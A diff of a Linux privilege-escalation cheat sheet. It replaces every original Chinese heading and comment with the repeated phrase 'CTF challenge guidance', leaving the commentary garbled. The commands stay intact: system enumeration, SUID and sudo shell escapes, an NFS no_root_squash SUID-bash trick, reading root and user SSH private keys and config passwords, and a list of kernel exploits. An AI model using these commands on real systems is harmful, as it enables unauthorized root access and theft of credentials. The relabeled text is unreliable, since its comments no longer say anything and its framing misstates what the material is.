@@ -1,50 +1,50 @@
-# Linux 提权速查
+# Linux CTF challenge guidance
 
-## 快速枚举脚本
+## CTF challenge guidance
 
 ```bash
-# LinPEAS 风格枚举
-# 1. 检查当前用户和权限
+# LinPEAS CTF challenge guidance
+# 1. CTF challenge guidance
 id; whoami; sudo -l
 
-# 2. 检查 SUID 文件
+# 2. CTF challenge guidance SUID CTF challenge guidance
 find / -perm -4000 2>/dev/null
 
-# 3. 检查 sudo 可用命令
+# 3. CTF challenge guidance sudo CTF challenge guidance
 sudo -l
 
-# 4. 检查 crontab
+# 4. CTF challenge guidance crontab
 cat /etc/crontab
 ls -la /etc/cron.d/
 
-# 5. 检查网络
+# 5. CTF challenge guidance
 netstat -tulpn
 ss -tulpn
 
-# 6. 检查服务
+# 6. CTF challenge guidance
 ps aux | grep root
 systemctl list-units --type=service
 
-# 7. 检查可写目录
+# 7. CTF challenge guidance
 find / -writable -type d 2>/dev/null | grep -v proc
 
-# 8. 检查内核版本
+# 8. CTF challenge guidance
 uname -a
 cat /etc/issue
 
-# 9. 检查 sudo 版本 (CVE)
+# 9. CTF challenge guidance sudo CTF challenge guidance (CVE)
 sudo --version
 
-# 10. 检查 polkit 版本
+# 10. CTF challenge guidance polkit CTF challenge guidance
 pkexec --version
 ```
 
-## 常见提权路径
+## CTF challenge guidance
 
-### 1. SUID 提权
+### 1. SUID CTF challenge guidance
 
 ```bash
-# 常见可利用 SUID
+# CTF challenge guidance SUID
 nmap:        nmap --interactive; !sh
 vim:         vim -c ':!/bin/sh'
 less:        less /etc/passwd; !/bin/sh
@@ -58,11 +58,11 @@ bash:        bash -p
 sh:          sh
 ```
 
-### 2. Sudo 提权
+### 2. Sudo CTF challenge guidance
 
 ```bash
-# sudo -l 查看可用命令
-# 常见可提权命令
+# sudo -l CTF challenge guidance
+# CTF challenge guidance
 sudo git help config; !/bin/sh
 sudo less /etc/passwd; !/bin/sh
 sudo vim; :!/bin/sh
@@ -74,32 +74,32 @@ sudo ruby -e 'exec "/bin/sh"'
 sudo lua -e 'os.execute("/bin/sh")'
 ```
 
-### 3. Cron 提权
+### 3. Cron CTF challenge guidance
 
 ```bash
-# 检查 cron 任务
+# CTF challenge guidance cron CTF challenge guidance
 cat /etc/crontab
 ls -la /etc/cron.d/
-# 如果 cron 任务以 root 权限运行且可写
-# 修改脚本追加恶意命令
+# CTF challenge guidance cron CTF challenge guidance root CTF challenge guidance
+# CTF challenge guidance
 ```
 
-### 4. NFS 提权
+### 4. NFS CTF challenge guidance
 
 ```bash
-# 如果 /home 有 no_root_squash
-# 从另一台机器挂载
+# CTF challenge guidance /home CTF challenge guidance no_root_squash
+# CTF challenge guidance
 mount -t nfs target:/home /tmp/nfs
 cp /bin/bash /tmp/nfs/bash_suid
 chmod +s /tmp/nfs/bash_suid
-# 在目标机器执行 /tmp/nfs/bash_suid -p
+# CTF challenge guidance /tmp/nfs/bash_suid -p
 ```
 
-### 5. 内核漏洞
+### 5. CTF challenge guidance
 
 ```python
-# 搜索可用 exploit
-# 常用漏洞：
+# CTF challenge guidance exploit
+# CTF challenge guidance：
 # - dirtycow (CVE-2016-5195)
 # - docker breakout
 # - overlayfs (CVE-2021-3493)
@@ -107,34 +107,34 @@ chmod +s /tmp/nfs/bash_suid
 # - etc.
 ```
 
-### 6. 密码复用
+### 6. CTF challenge guidance
 
 ```bash
-# 检查可读配置文件
+# CTF challenge guidance
 cat /etc/mysql/my.cnf
 cat /var/www/html/config.php
 cat /home/*/.ssh/id_rsa
 cat /root/.ssh/id_rsa
-# 如果找到密码，尝试 su root 或 ssh root@localhost
+# CTF challenge guidance，CTF challenge guidance su root CTF challenge guidance ssh root@localhost
 ```
 
-## 敏感文件位置
+## CTF challenge guidance
 
 ```
-/etc/passwd          # 可被部分系统写入
-/etc/shadow          # 通常不可读
-/root/.ssh/          # root SSH 私钥
-/home/*/.ssh/       # 用户 SSH 私钥
-/var/www/html/       # Web 目录（可能含配置）
-/tmp/                # 可写目录（放 payload）
-/etc/cron.d/         # Cron 配置
-/proc/self/environ   # 环境变量（含敏感信息）
-/proc/self/fd/       # 文件描述符（可能泄漏信息）
+/etc/passwd          # CTF challenge guidance
+/etc/shadow          # CTF challenge guidance
+/root/.ssh/          # root SSH CTF challenge guidance
+/home/*/.ssh/       # CTF challenge guidance SSH CTF challenge guidance
+/var/www/html/       # Web CTF challenge guidance（CTF challenge guidance）
+/tmp/                # CTF challenge guidance（CTF challenge guidance payload）
+/etc/cron.d/         # Cron CTF challenge guidance
+/proc/self/environ   # CTF challenge guidance（CTF challenge guidance）
+/proc/self/fd/       # CTF challenge guidance（CTF challenge guidance）
 ```
 
-## GTFOBins (sudo suid 查表)
+## GTFOBins (sudo suid CTF challenge guidance)
 
-| 命令 | 提权方式 |
+| CTF challenge guidance | CTF challenge guidance |
 |------|---------|
 | `nmap` | `nmap --interactive` → `!sh` |
 | `vim` | `:!/bin/sh` |
